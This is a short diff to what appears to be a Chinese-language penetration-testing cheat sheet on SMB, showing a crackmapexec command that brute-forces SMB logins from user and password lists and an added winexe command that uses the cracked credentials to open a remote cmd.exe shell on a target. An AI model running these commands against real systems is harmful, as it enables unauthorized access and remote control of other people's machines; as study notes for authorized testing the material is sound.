@@ -121,3 +121,5 @@ CIFS / SMB - TCP 139,445
 
     暴力破解crackmapexec smb <smb_IP> -u <users.txt> -p <password.txt>
 <img  alt="image" src="https://github.com/user-attachments/assets/a04beb33-4191-4435-8823-0e65c879b74d">
+
+    利用爆破拿到的帳密執行winexe winexe –U 'Username%Password' //<IP> cmd.exe
